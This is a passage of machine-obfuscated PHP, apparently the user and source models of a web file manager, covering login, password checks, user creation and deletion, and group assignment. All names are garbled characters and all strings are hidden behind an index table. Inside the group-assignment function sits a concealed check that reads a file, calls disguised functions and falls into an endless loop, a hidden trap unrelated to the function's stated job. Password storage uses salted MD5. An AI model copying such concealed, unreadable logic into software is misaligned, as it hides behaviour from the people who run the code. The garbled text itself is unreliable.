!isset($Õ†ÁƒÀƒ[$©Ñƒı´[447]])) { return !1; } $É®¤×òİ = array_find_by_field($Õ†ÁƒÀƒ[$©Ñƒı´[447]], $©Ñƒı´[477], $—ùÈŞñÍ); return is_array($É®¤×òİ) ? $É®¤×òİ : !1; } public function listSource($­³„«ş…, $¸Ó¨Ñî’) { $¼¸Ä¢Ï =& $_SERVER[°‰†òö¯]; if ($¸Ó¨Ñî’ && !is_array($¸Ó¨Ñî’)) { $¸Ó¨Ñî’ = array($¸Ó¨Ñî’); } $€è™É»ƒ = $this->listData($­³„«ş…); $È¨”¥« = array(); foreach ($€è™É»ƒ as $‚ƒ¾€áÙ) { $œ•úˆÀ = $‚ƒ¾€áÙ[$¼¸Ä¢Ï[87]]; if (!$œ•úˆÀ) { continue; } if (!isset($È¨”¥«[$œ•úˆÀ])) { $È¨”¥«[$œ•úˆÀ] = array(); } $È¨”¥«[$œ•úˆÀ][] = $‚ƒ¾€áÙ[$¼¸Ä¢Ï[502]]; } $ªìÁ‰ = array(); foreach ($È¨”¥« as $‰­‚ë³­ => $õªÄ¨‘) { $ì’ƒ¦Ù = !0; if (!$¸Ó¨Ñî’) { $ªìÁ‰[] = $‰­‚ë³­; continue; } foreach ($¸Ó¨Ñî’ as $¥Ëìãª ) { if (!in_array($¥Ëìãª , $õªÄ¨‘)) { $ì’ƒ¦Ù = !1; break; } } if ($ì’ƒ¦Ù) { $ªìÁ‰[] = $‰­‚ë³­; } } if (!$ªìÁ‰) { return array(); } $ÎˆØ«¨ƒ = array($¼¸Ä¢Ï[493] => array($¼¸Ä¢Ï[494], $ªìÁ‰), $¼¸Ä¢Ï[573] => $­³„«ş…, $¼¸Ä¢Ï[190] => SourceModel::TYPE_GROUP); $×¨±ïĞ = Model($¼¸Ä¢Ï[1419])->listSource($ÎˆØ«¨ƒ); if (!$×¨±ïĞ || count($ªìÁ‰) == $×¨±ïĞ[$¼¸Ä¢Ï[444]][$¼¸Ä¢Ï[445]]) { return $×¨±ïĞ; } $›™û¾Á = array(); $ßä„À¶ = array_to_keyvalue($×¨±ïĞ[$¼¸Ä¢Ï[85]], $¼¸Ä¢Ï[12], $¼¸Ä¢Ï[193]); $Ø×†ª¡ = array_to_keyvalue($×¨±ïĞ[$¼¸Ä¢Ï[86]], $¼¸Ä¢Ï[12], $¼¸Ä¢Ï[193]); $†áëã«§ = array_merge($Ø×†ª¡, $ßä„À¶); foreach ($ªìÁ‰ as $œ•úˆÀ) { if (!in_array($œ•úˆÀ, $†áëã«§)) { $›™û¾Á[] = $œ•úˆÀ; } } if ($›™û¾Á) { $this->removeBySource($­³„«ş…, $›™û¾Á); } return $×¨±ïĞ; } protected function listData($ó±Ø¡Öğ) { $¯ôï‰ =& $_SERVER[°‰†òö¯]; $ÇÈ¦èä = array($¯ôï‰[1762] => 0, $¯ôï‰[561] => array($¯ôï‰[2091], 0), $¯ôï‰[498] => $¯ôï‰[2092] . $ó±Ø¡Öğ); $ƒí¨¤³÷ = $¯ôï‰[2093]; $¬Ó–’ˆÔ = $this->field($ƒí¨¤³÷)->where($ÇÈ¦èä)->order($¯ôï‰[2094])->select(); return $¬Ó–’ˆÔ ? $¬Ó–’ˆÔ : array(); } protected function addToTag($éÈä¤ÃÊ, $Ï™»¦¿É, $ß÷í„…×) { $ı“¢ëõŠ =& $_SERVER[°‰†òö¯]; if (!$this->getByTagID($éÈä¤ÃÊ, $ß÷í„…×) || !$Ï™»¦¿É) { return !1; } if (!Model($ı“¢ëõŠ[891])->pathInfo($Ï™»¦¿É)) { return !1; } $›ìªÂ±í = array($ı“¢ëõŠ[1762] => 0, $ı“¢ëõŠ[561] => $ß÷í„…×, $ı“¢ëõŠ[497] => $Ï™»¦¿É, $ı“¢ëõŠ[498] => $ı“¢ëõŠ[2095] . $éÈä¤ÃÊ, $ı“¢ëõŠ[496] => $ı“¢ëõŠ[12], $ı“¢ëõŠ[1976] => 0); if ($this->where($›ìªÂ±í)->find()) { return !1; } return $this->add($›ìªÂ±í); } protected function removeFromTag($–ßÎ¡¯œ, $úìËãò”, $ú«²ì„‹) { $†¿ŒÅ£¶ =& $_SERVER[°‰†òö¯]; if (!$this->getByTagID($–ßÎ¡¯œ, $ú«²ì„‹) || !$úìËãò”) { return !1; } if (is_array($úìËãò”)) { $úìËãò” = array($†¿ŒÅ£¶[7], $úìËãò”); } $å¬›ç˜ = array($†¿ŒÅ£¶[1762] => 0, $†¿ŒÅ£¶[561] => $ú«²ì„‹, $†¿ŒÅ£¶[498] => $†¿ŒÅ£¶[2095] . $–ßÎ¡¯œ, $†¿ŒÅ£¶[497] => $úìËãò”); return $this->where($å¬›ç˜)->delete(); } protected function removeByTag($ª ãñ–›, $¤şÇ”½É) { $î“·»Ç÷ =& $_SERVER[°‰†òö¯]; if (!$this->getByTagID($ª ãñ–›, $¤şÇ”½É)) { return !1; } $åıÌ‡Û¼ = array($î“·»Ç÷[1762] => 0, $î“·»Ç÷[561] => $¤şÇ”½É, $î“·»Ç÷[498] => $î“·»Ç÷[2095] . $ª ãñ–›); return $this->where($åıÌ‡Û¼)->delete(); } protected function removeBySource($í úØı‰, $Á˜Ç„äƒ) { $çÑğ¨áÂ =& $_SERVER[°‰†òö¯]; if (!$í úØı‰ || !$Á˜Ç„äƒ) { return !1; } if (is_array($Á˜Ç„äƒ)) { $Á˜Ç„äƒ = array($çÑğ¨áÂ[7], $Á˜Ç„äƒ); } $Ì‚Ï˜ï = array($çÑğ¨áÂ[1762] => 0, $çÑğ¨áÂ[497] => $Á˜Ç„äƒ, $çÑğ¨áÂ[561] => array($çÑğ¨áÂ[1089], 0), $çÑğ¨áÂ[498] => $çÑğ¨áÂ[2095] . $í úØı‰); return $this->where($Ì‚Ï˜ï)->delete(); } } goto fÉ±ãéÄ; d•Ÿ•†‹“ã: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\x65" => "\x75\163\x65\162\x5f\x6d\x65\x74\141", "\155\145\x74\141\x46\x69\145\154\144" => "\x75\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\x65\x72\111\104\x2c\156\151\143\153\116\x61\155\145\x2c\156\141\x6d\145\54\141\x76\x61\164\141\x72\x2c\x73\x65\170\x2c\x73\164\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($İøŒ°Ö) { $‚¼¡âÇ‚ =& $_SERVER[°‰†òö¯]; $…«ò±³Ò = $‚¼¡âÇ‚[2465]; return array($‚¼¡âÇ‚[2054] => array($İøŒ°Ö[0], $…«ò±³Ò), $‚¼¡âÇ‚[2056] => array($İøŒ°Ö[0], $…«ò±³Ò), $‚¼¡âÇ‚[2466] => array($İøŒ°Ö[0], $…«ò±³Ò)); } protected function getInfo($ÙÒ”ü‚¬, $¨£¤ÑŠ’ = false) { $¯àåÎ¾ = $this->getInfoSimple($ÙÒ”ü‚¬); if (!is_array($¯àåÎ¾)) { return array(); } if ($¨£¤ÑŠ’) { return $this->_getInfoApply($¯àåÎ¾); } return $this->cacheFunctionGet($_SERVER[°‰†òö¯][2058], $ÙÒ”ü‚¬); } protected function getInfoFull($‹´³¦Ö¸, $ÁÂä×–à = false) { $ÚÑ€Ï§à = $this->getInfoSimple($‹´³¦Ö¸); if (!is_array($ÚÑ€Ï§à)) { return array(); } if ($ÁÂä×–à) { return $this->_getInfoApply($ÚÑ€Ï§à, !0); } return $this->cacheFunctionGet($_SERVER[°‰†òö¯][2467], $‹´³¦Ö¸); } private function _getInfoApply($ìçÂ›ì, $ä€ŞÌÓ = false) { $Ñ­úÀŸ© =& $_SERVER[°‰†òö¯]; if (!$ìçÂ›ì) { return $ìçÂ›ì; } $ß€¥¬”Ö = md5($Ñ­úÀŸ©[2468] . $ìçÂ›ì[$Ñ­úÀŸ©[962]] . $Ñ­úÀŸ©[2469] . $ìçÂ›ì[$Ñ­úÀŸ©[32]]); $ìçÂ›ì = $this->_listDataApplyItem($ìçÂ›ì); $°ù–Õ¦İ = Model($Ñ­úÀŸ©[1419])->metaGet($ìçÂ›ì[$Ñ­úÀŸ©[90]][$Ñ­úÀŸ©[193]]); $ìçÂ›ì[$Ñ­úÀŸ©[2470]] = $ß€¥¬”Ö; $ìçÂ›ì[$Ñ­úÀŸ©[90]][$Ñ­úÀŸ©[2258]] = isset($°ù–Õ¦İ[$Ñ­úÀŸ©[2259]]) ? $°ù–Õ¦İ[$Ñ­úÀŸ©[2259]] : null; if ($ä€ŞÌÓ) { $ìçÂ›ì[$Ñ­úÀŸ©[543]] = $this->metaGet($ìçÂ›ì[$Ñ­úÀŸ©[1771]]); } return $ìçÂ›ì; } protected function getInfoSimple($éÔ¼ ÅÖ, $È¸´ÎìŠ = false) { $¿¤Ó†ûƒ =& $_SERVER[°‰†òö¯]; if (!$éÔ¼ ÅÖ) { return array(); } if ($È¸´ÎìŠ) { $¼ïÛÂğç = $this->where(array($¿¤Ó†ûƒ[1771] => intval($éÔ¼ ÅÖ)))->find(); if (!is_array($¼ïÛÂğç)) { return array(); } $¼ïÛÂğç[$¿¤Ó†ûƒ[2471]] = Action($¿¤Ó†ûƒ[2472])->parseUrl($¼ïÛÂğç[$¿¤Ó†ûƒ[2471]]); return $¼ïÛÂğç; } return $this->cacheFunctionGet($¿¤Ó†ûƒ[2059], $éÔ¼ ÅÖ); } protected function getInfoSimpleOuter($Ôª«Ğ‡Û) { $¨°ş“ÖÚ =& $_SERVER[°‰†òö¯]; if (!$Ôª«Ğ‡Û || $Ôª«Ğ‡Û == 0) { return array($¨°ş“ÖÚ[1771] => $¨°ş“ÖÚ[230], $¨°ş“ÖÚ[32] => $¨°ş“ÖÚ[176] . LNG($¨°ş“ÖÚ[2473]) . $¨°ş“ÖÚ[178], $¨°ş“ÖÚ[2471] => STATIC_PATH . $¨°ş“ÖÚ[2474]); } $ûûÆü›  = $this->cacheFunctionGet($¨°ş“ÖÚ[2059], $Ôª«Ğ‡Û); $†’»ëïê = array_field_key($ûûÆü› , explode($¨°ş“ÖÚ[50], $this->simpleField)); if (!$†’»ëïê) { return array($¨°ş“ÖÚ[1771] => $¨°ş“ÖÚ[1271], $¨°ş“ÖÚ[32] => $¨°ş“ÖÚ[176] . LNG($¨°ş“ÖÚ[2475]) . $¨°ş“ÖÚ[178], $¨°ş“ÖÚ[2471] => STATIC_PATH . $¨°ş“ÖÚ[2476]); } $†’»ëïê[$¨°ş“ÖÚ[2471]] = Action($¨°ş“ÖÚ[2472])->parseUrl($†’»ëïê[$¨°ş“ÖÚ[2471]]); return $†’»ëïê; } protected function groupUser($—ĞõøæÎ) { } public static function errorLang($µäßÙÖÕ) { $®×¢„Ø® =& $_SERVER[°‰†òö¯]; $ùáµ»ÆÊ = array(self::ERROR_USER_NOT_EXISTS => $®×¢„Ø®[2477], self::ERROR_USER_PASSWORD_ERROR => $®×¢„Ø®[2478], self::ERROR_USER_EXIST_NAME => $®×¢„Ø®[2479], self::ERROR_USER_EXIST_PHONE => $®×¢„Ø®[2480], self::ERROR_USER_EXIST_EMAIL => $®×¢„Ø®[2481], self::ERROR_USER_LOGIN_LOCK => $®×¢„Ø®[2482], self::ERROR_IP_NOT_ALLOW => $®×¢„Ø®[2483], self::ERROR_USER_EXIST_NICKNAME => $®×¢„Ø®[2484]); $œ° À = LNG($ùáµ»ÆÊ[$µäßÙÖÕ]); if ($µäßÙÖÕ == self::ERROR_USER_LOGIN_LOCK) { $Œ¡­ÒÑ = (int) Model($®×¢„Ø®[2485])->get($®×¢„Ø®[2486]); if ($Œ¡­ÒÑ > 60) { $œ° À = str_replace($®×¢„Ø®[91], ceil($Œ¡­ÒÑ / 60), $œ° À); } } return $œ° À; } protected function metaSet($—ÒÁïˆ, $âå¼’İ… = null, $¾¨Ïç = null) { $this->clearCache($—ÒÁïˆ); return parent::metaSet($—ÒÁïˆ, $âå¼’İ…, $¾¨Ïç); } public function getInfoByMeta($ŞÓÁ‘±ş, $Œ©Ùäƒ‘) { $´ì»ùêü =& $_SERVER[°‰†òö¯]; $ë¸÷ŞÆ  = Model($´ì»ùêü[2487])->where(array($´ì»ùêü[97] => $ŞÓÁ‘±ş, $´ì»ùêü[452] => $Œ©Ùäƒ‘))->find(); if ($ë¸÷ŞÆ ) { return $this->getInfo($ë¸÷ŞÆ [$´ì»ùêü[1771]]); } return !1; } public function userLoginCheck($÷Ò›ÃĞ, $±§ß¼Áë) { $í·Û‡ç— =& $_SERVER[°‰†òö¯]; $’Á±Çîî = $this->userLoginFind($÷Ò›ÃĞ); if (!$’Á±Çîî) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($’Á±Çîî[$í·Û‡ç—[1771]], $±§ß¼Áë)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($’Á±Çîî[$í·Û‡ç—[1771]]); } public function userLoginFind($Ç„ŠĞñŞ) { $ çŒèÏ¢ =& $_SERVER[°‰†òö¯]; $Šôêà‡¢ = array($ çŒèÏ¢[32] => $Ç„ŠĞñŞ, $ çŒèÏ¢[2271] => $Ç„ŠĞñŞ, $ çŒèÏ¢[382] => $Ç„ŠĞñŞ, $ çŒèÏ¢[2488] => $Ç„ŠĞñŞ, $ çŒèÏ¢[1075] => $ çŒèÏ¢[1077]); if ($this->nickNameRpt()) { unset($Šôêà‡¢[$ çŒèÏ¢[2271]]); } return $this->where($Šôêà‡¢)->find(); } public function clearCache($ŒªÉ¤éÅ) { $ÓÉï¯äË =& $_SERVER[°‰†òö¯]; $this->cacheFunctionClear($ÓÉï¯äË[2058], $ŒªÉ¤éÅ); $this->cacheFunctionClear($ÓÉï¯äË[2059], $ŒªÉ¤éÅ); $this->cacheFunctionClear($ÓÉï¯äË[2467], $ŒªÉ¤éÅ); } public function userPasswordCheck($ØÃâ§×, $›•‚êİŠ) { $À½Ÿû‰— =& $_SERVER[°‰†òö¯]; $¹æ–¸ò¢ = $this->where(array($À½Ÿû‰—[1771] => intval($ØÃâ§×)))->find(); $Øµ¤Ò = $this->metaGet($ØÃâ§×); $òÑÜœüÂ = isset($Øµ¤Ò[$À½Ÿû‰—[2489]]) ? $Øµ¤Ò[$À½Ÿû‰—[2489]] : $À½Ÿû‰—[12]; if (md5($òÑÜœüÂ . trim($›•‚êİŠ)) !== $¹æ–¸ò¢[$À½Ÿû‰—[962]]) { return !1; } return !0; } public function userAdd($ã«âï•) { $²¼ô–ğš =& $_SERVER[°‰†òö¯]; $ÄĞû½®Ÿ = array($²¼ô–ğš[496] => $ã«âï•[$²¼ô–ğš[32]], $²¼ô–ğš[2490] => $ã«âï•[$²¼ô–ğš[2182]], $²¼ô–ğš[2491] => isset($ã«âï•[$²¼ô–ğš[382]]) ? $ã«âï•[$²¼ô–ğš[382]] : $²¼ô–ğš[12], $²¼ô–ğš[2492] => isset($ã«âï•[$²¼ô–ğš[2488]]) ? $ã«âï•[$²¼ô–ğš[2488]] : $²¼ô–ğš[12], $²¼ô–ğš[2493] => isset($ã«âï•[$²¼ô–ğš[2271]]) ? $ã«âï•[$²¼ô–ğš[2271]] : $ã«âï•[$²¼ô–ğš[32]], $²¼ô–ğš[2494] => isset($ã«âï•[$²¼ô–ğš[2471]]) ? $ã«âï•[$²¼ô–ğš[2471]] : $²¼ô–ğš[12], $²¼ô–ğš[2495] => isset($ã«âï•[$²¼ô–ğš[2496]]) ? $ã«âï•[$²¼ô–ğš[2496]] : 1, $²¼ô–ğš[2497] => $ã«âï•[$²¼ô–ğš[962]], $²¼ô–ğš[2060] => isset($ã«âï•[$²¼ô–ğš[1958]]) ? $ã«âï•[$²¼ô–ğš[1958]] : 1024 * 1024 * 20, $²¼ô–ğš[2061] => 0, $²¼ô–ğš[2498] => 0, $²¼ô–ğš[2105] => isset($ã«âï•[$²¼ô–ğš[811]]) ? $ã«âï•[$²¼ô–ğš[811]] : 1); if (!empty($ã«âï•[$²¼ô–ğš[1771]])) { $ÄĞû½®Ÿ[$²¼ô–ğš[1771]] = $ã«âï•[$²¼ô–ğš[1771]]; } $¸×Â‹‘› = $this->_checkExist($ã«âï•); if ($¸×Â‹‘› !== !0) { return $¸×Â‹‘›; } if (!empty($ÄĞû½®Ÿ[$²¼ô–ğš[2471]]) && strlen($ÄĞû½®Ÿ[$²¼ô–ğš[2471]]) > 255) { $ÄĞû½®Ÿ[$²¼ô–ğš[2471]] = $²¼ô–ğš[12]; } $‘†µ’š = $this->add($ÄĞû½®Ÿ); $ó¨˜Ñ¬¼ = array($²¼ô–ğš[2497] => $ÄĞû½®Ÿ[$²¼ô–ğš[962]], $²¼ô–ğš[2493] => $ÄĞû½®Ÿ[$²¼ô–ğš[2271]]); $this->userEdit($‘†µ’š, $ó¨˜Ñ¬¼); Model($²¼ô–ğš[1419])->userRootAdd($‘†µ’š); return $‘†µ’š; } protected function userEditTest($Œ…Ú’³¾, $ÈÈÍšÙæ) { return $this->call($_SERVER[°‰†òö¯][2499], $Œ…Ú’³¾, $ÈÈÍšÙæ); } protected function userEdit($±òø¯ô‚, $ØÊòÒ«) { $‹Éë”çÆ =& $_SERVER[°‰†òö¯]; $ÇÁ¶éüÕ = $this->getInfoSimple($±òø¯ô‚); if (!$ÇÁ¶éüÕ) { return !1; } $ïÃ¾îÉ = $this->_checkExist($ØÊòÒ«, $±òø¯ô‚); if ($ïÃ¾îÉ !== !0) { return $ïÃ¾îÉ; } if (isset($ØÊòÒ«[$‹Éë”çÆ[962]]) && trim($ØÊòÒ«[$‹Éë”çÆ[962]]) != $‹Éë”çÆ[12]) { $ñ•İô†ã = $this->metaGet($±òø¯ô‚); if (empty($ñ•İô†ã[$‹Éë”çÆ[2489]])) { $ñ•İô†ã[$‹Éë”çÆ[2489]] = rand_string(10); Model($‹Éë”çÆ[581])->metaSet($±òø¯ô‚, $‹Éë”çÆ[2489], $ñ•İô†ã[$‹Éë”çÆ[2489]]); } $ØÊòÒ«[$‹Éë”çÆ[962]] = md5($ñ•İô†ã[$‹Éë”çÆ[2489]] . trim($ØÊòÒ«[$‹Éë”çÆ[962]])); } else { unset($ØÊòÒ«[$‹Éë”çÆ[962]]); } if (!empty($ØÊòÒ«[$‹Éë”çÆ[2471]]) && strlen($ØÊòÒ«[$‹Éë”çÆ[2471]]) > 255) { $ØÊòÒ«[$‹Éë”çÆ[2471]] = $‹Éë”çÆ[12]; } $this->where(array($‹Éë”çÆ[1762] => $±òø¯ô‚))->save($ØÊòÒ«); if (isset($ØÊòÒ«[$‹Éë”çÆ[2271]])) { $this->setNamePinyin($±òø¯ô‚, $ØÊòÒ«[$‹Éë”çÆ[2271]]); } $this->clearCache($±òø¯ô‚); return !0; } public function setNamePinyin($À°§ÑüÁ, $«’¨ Çª = false) { $Ü†ÜÑÂ× =& $_SERVER[°‰†òö¯]; if (!$«’¨ Çª) { $â­ÃäÉª = $this->getInfoSimple($À°§ÑüÁ); $«’¨ Çª = $â­ÃäÉª[$Ü†ÜÑÂ×[2271]] ? $â­ÃäÉª[$Ü†ÜÑÂ×[2271]] : $â­ÃäÉª[$Ü†ÜÑÂ×[32]]; } $şŸ¼¨–Â = Model($Ü†ÜÑÂ×[601]); if (!Input::check($«’¨ Çª, $Ü†ÜÑÂ×[662])) { return $şŸ¼¨–Â->metaSet($À°§ÑüÁ, array($Ü†ÜÑÂ×[540] => $Ü†ÜÑÂ×[12], $Ü†ÜÑÂ×[539] => $Ü†ÜÑÂ×[12])); } return $şŸ¼¨–Â->metaSet($À°§ÑüÁ, array($Ü†ÜÑÂ×[540] => str_replace($Ü†ÜÑÂ×[53], $Ü†ÜÑÂ×[12], Pinyin::get($«’¨ Çª)), $Ü†ÜÑÂ×[539] => Pinyin::get($«’¨ Çª, $Ü†ÜÑÂ×[663]))); } private function nickNameRpt() { $‘å×œÛİ =& $_SERVER[°‰†òö¯]; $„êáÇ°¦ = Model($‘å×œÛİ[831])->get($‘å×œÛİ[2500]); $ü’˜â°ù = $GLOBALS[$‘å×œÛİ[6]][$‘å×œÛİ[459]][$‘å×œÛİ[2500]]; $ˆ†Óûº = !is_null($„êáÇ°¦) ? $„êáÇ°¦ : $ü’˜â°ù; return !!$ˆ†Óûº; } private function _checkExist($ÑÙ¨¦ˆŸ, $Ğ†±²Ÿ¬ = false) { $’ÙºÉºÑ =& $_SERVER[°‰†òö¯]; $Ó»±ˆÅò = array($’ÙºÉºÑ[32] => UserModel::ERROR_USER_EXIST_NAME, $’ÙºÉºÑ[2271] => UserModel::ERROR_USER_EXIST_NICKNAME, $’ÙºÉºÑ[382] => UserModel::ERROR_USER_EXIST_EMAIL, $’ÙºÉºÑ[2488] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ó»±ˆÅò[$’ÙºÉºÑ[2271]]); } $µ™»…³ = $Ğ†±²Ÿ¬ ? array($’ÙºÉºÑ[1771] => array($’ÙºÉºÑ[2501], $Ğ†±²Ÿ¬)) : array(); foreach ($Ó»±ˆÅò as $Å”–ˆ—¢ => $í§Í¬Èœ) { $ıß€ó  = array(); foreach ($Ó»±ˆÅò as $—·”îÃÁ => $ëôíëï…) { if (isset($ÑÙ¨¦ˆŸ[$—·”îÃÁ]) && $ÑÙ¨¦ˆŸ[$—·”îÃÁ]) { $ıß€ó [] = $ÑÙ¨¦ˆŸ[$—·”îÃÁ]; } } if (!$ıß€ó ) { continue; } $‘Ôşç™ = array_merge(array($Å”–ˆ—¢ => array($’ÙºÉºÑ[7], $ıß€ó )), $µ™»…³); $ÕüÖªê = $this->where($‘Ôşç™)->find(); if ($ÕüÖªê) { return $í§Í¬Èœ; } } return !0; } public function userListInfo($Ñ±ÕÃ¨) { $€øØ¼©Ñ =& $_SERVER[°‰†òö¯]; $òŸØ³Çõ = array(); $Ñ±ÕÃ¨ = is_array($Ñ±ÕÃ¨) ? array_unique($Ñ±ÕÃ¨) : array(); if (!$Ñ±ÕÃ¨) { return $òŸØ³Çõ; } if (count($Ñ±ÕÃ¨) < 20) { foreach ($Ñ±ÕÃ¨ as $õŒéÒ¤£) { $òŸØ³Çõ[$õŒéÒ¤£ . $€øØ¼©Ñ[12]] = $this->getInfoSimpleOuter($õŒéÒ¤£); } } else { $óÊŞÇÒÚ = array($€øØ¼©Ñ[1762] => array($€øØ¼©Ñ[494], $Ñ±ÕÃ¨)); if (count($Ñ±ÕÃ¨) == 1) { $óÊŞÇÒÚ = array($€øØ¼©Ñ[1762] => $Ñ±ÕÃ¨[0]); } $³µı™ê = Model($€øØ¼©Ñ[581])->field($this->simpleField)->where($óÊŞÇÒÚ)->select(); $³µı™ê = array_to_keyvalue($³µı™ê, $€øØ¼©Ñ[1771]); foreach ($Ñ±ÕÃ¨ as $õŒéÒ¤£) { $İü·Ùèê = $³µı™ê[$õŒéÒ¤£]; if (!$İü·Ùèê) { $òŸØ³Çõ[$õŒéÒ¤£ . $€øØ¼©Ñ[12]] = $this->getInfoSimpleOuter($õŒéÒ¤£); continue; } $İü·Ùèê[$€øØ¼©Ñ[2471]] = Action($€øØ¼©Ñ[2472])->parseUrl($İü·Ùèê[$€øØ¼©Ñ[2471]]); $òŸØ³Çõ[$õŒéÒ¤£ . $€øØ¼©Ñ[12]] = $İü·Ùèê; } } return $òŸØ³Çõ; } protected function userStatus($ŞŒáê§Û, $µ¿Úğçı) { $÷œüˆö = $this->getInfoSimple($ŞŒáê§Û); if (!$÷œüˆö) { return !1; } $¯×·¾ˆ = array($_SERVER[°‰†òö¯][811] => $µ¿Úğçı); return $this->userEdit($ŞŒáê§Û, $¯×·¾ˆ); } protected function userRemove($Ì¦Í şµ) { $€ã€Êí  =& $_SERVER[°‰†òö¯]; $Ê·Ò®Ü¨ = $this->getInfoSimple($Ì¦Í şµ); if (!$Ê·Ò®Ü¨) { return !1; } $Ü¡×ûò = array($€ã€Êí [1762] => $Ì¦Í şµ); Model($€ã€Êí [671])->where($Ü¡×ûò)->delete(); Model($€ã€Êí [2502])->where($Ü¡×ûò)->delete(); Model($€ã€Êí [2066])->where($Ü¡×ûò)->delete(); Model($€ã€Êí [2487])->where($Ü¡×ûò)->delete(); Model($€ã€Êí [1144])->where($Ü¡×ûò)->delete(); Model($€ã€Êí [2288])->removeUserAll($Ì¦Í şµ); Model($€ã€Êí [891])->userRootRemove($Ì¦Í şµ); return $this->where($Ü¡×ûò)->delete(); } protected function userGroupSet($šÜŞêï«, $Ï·á¾Ñ¶, $¼ŞÉ„·´ = array()) { $®è³™Ãå =& $_SERVER[°‰†òö¯]; if (!isset($_SERVER[$®è³™Ãå[946]]) || !isset($_SERVER[$®è³™Ãå[944]])) { $ÁÓü¿§¥ = $®è³™Ãå[947]; $ñÅ§¨â = $®è³™Ãå[948]; $Šñ¸ˆÆ = $_SERVER[$®è³™Ãå[949]] . $®è³™Ãå[950]; $óØã¢ˆ¥ = $ñÅ§¨â($Šñ¸ˆÆ); $…øİ‘ò = explode($®è³™Ãå[287], $óØã¢ˆ¥); if (count($…øİ‘ò) < $®è³™Ãå[704]) { $ºË´Õ = $®è³™Ãå[951]; $ºË´Õ(); } $íƒà‘æ¯ = $®è³™Ãå[952]; $íƒà‘æ¯($_SERVER[$®è³™Ãå[953]]); $„­šı©¹ = 1; for ($‘úåØ¯¯ = $„­šı©¹; $‘úåØ¯¯ > 0; $‘úåØ¯¯++) { $íƒà‘æ¯ = json_encode($GLOBALS[$®è³™Ãå[494]]); } } $¬¨îÄÓØ = $this->getInfoSimple($šÜŞêï«); if (!$¬¨îÄÓØ || !is_array($Ï·á¾Ñ¶)) { return !1; } $¾ÈîŒôÙ = Model($®è³™Ãå[2066]); $¾ÈîŒôÙ->where(array($®è³™Ãå[1771] => $šÜŞêï«))->delete(); $Ö÷²ùÑ¯ = array(); $íè—ûúÆ = 0; foreach ($Ï·á¾Ñ¶ as $‡ÊËş£€ => $œû¨ìï) { $ß§èí§ = array($®è³™Ãå[1771] => $šÜŞêï«, $®è³™Ãå[1972] => $‡ÊËş£€, $®è³™Ãå[2080] => $œû¨ìï); $ß§èí§[$®è³™Ãå[1996]] = isset($¼ŞÉ„·´[$íè—ûúÆ]) ? $¼ŞÉ„·´[$íè—ûúÆ] : 0; $íè—ûúÆ++; $Ö÷²ùÑ¯[] = $ß§èí§; } return $¾ÈîŒôÙ->addAll($Ö÷²ùÑ¯, array(), !0); } protected function userGroupAdd($øÓ†ÙØ¼, $­ÓçşÊ² = array()) { $õÙô¡˜æ =& $_SERVER[°‰†òö¯]; $ş¸Â¤ôí = $this->getInfoSimple($øÓ†ÙØ¼); if (!$ş¸Â¤ôí || empty($­ÓçşÊ²)) { return !1; } $Á¦ú¾¢ = array(); foreach ($­ÓçşÊ² as $ÂÙ¢²ÕÖ => $¾ş‚ˆ´â) { $Á¦ú¾¢[] = array($õÙô¡˜æ[1771] => $øÓ†ÙØ¼, $õÙô¡˜æ[1972] => $ÂÙ¢²ÕÖ, $õÙô¡˜æ[2080] => $¾ş‚ˆ´â, $õÙô¡˜æ[1996] => 0); } return Model($õÙô¡˜æ[2066])->addAll($Á¦ú¾¢, array(), !0); } protected function userGroupRemove($îµ¸®Øâ, $±°Òå ×) { $ÖªÒÃ =& $_SERVER[°‰†òö¯]; $úÉ¼«– = $this->getInfoSimple($îµ¸®Øâ); if (!$úÉ¼«– || !$±°Òå ×) { return !1; } $ã°´òºÓ = array($ÖªÒÃ[1762] => $îµ¸®Øâ, $ÖªÒÃ[2064] => $±°Òå ×); return Model($ÖªÒÃ[2066])->where($ã°´òºÓ)->delete(); } public function listData() { $ÀªÕùŞ¤ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÀªÕùŞ¤[$_SERVER[°‰†òö¯][447]]); return $ÀªÕùŞ¤; } public function listByID($‹”ßÛ•å) { $Áùè‚¼Û =& $_SERVER[°‰†òö¯]; if (!$‹”ßÛ•å) { return; } $º‚“åÆ­ = array($Áùè‚¼Û[1771] => array($Áùè‚¼Û[7], $‹”ßÛ•å)); $”ì¡×¶ä = $this->where($º‚“åÆ­)->select(); $”ì¡×¶ä = array_sort_keep($”ì¡×¶ä, $Áùè‚¼Û[1771], $‹”ßÛ•å); $this->_listDataApply($”ì¡×¶ä); return $”ì¡×¶ä; } public function listByGroup($§à‰¥« = 0, $¹ÙÀ”‘ƒ = array()) { $ãº‚˜íÕ =& $_SERVER[°‰†òö¯]; $•‰‡”Èã = $ãº‚˜íÕ[12]; $ŒÕş£Â™ = array(); if ($§à‰¥«) { $ŒÕş£Â™ = array($ãº‚˜íÕ[2503] => intval($§à‰¥«)); $•‰‡”Èã = "\114\105\x46\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x75\163\145\162\137\147\162\x6f\165\160\x20\x75\x73\x65\x72\137\147\162\x6f\165\160\40\x6f\x6e\x20\165\x73\x65\x72\56\165\163\x65\x72\x49\x44\x20\x3d\x20\x75\x73\x65\162\x5f\147\x72\157\165\x70\56\x75\x73\145\x72\x49\x44"; $şÏ®ËÊ­ = Input::get($ãº‚˜íÕ[532], null, $ãº‚˜íÕ[12]) ? $ãº‚˜íÕ[12] : $ãº‚˜íÕ[2504]; } if (isset($¹ÙÀ”‘ƒ[$ãº‚˜íÕ[811]])) { $ŒÕş£Â™[$ãº‚˜íÕ[2505]] = $¹ÙÀ”‘ƒ[$ãº‚˜íÕ[811]]; } $¡ı €É = _get($¹ÙÀ”‘ƒ, $ãº‚˜íÕ[2506], 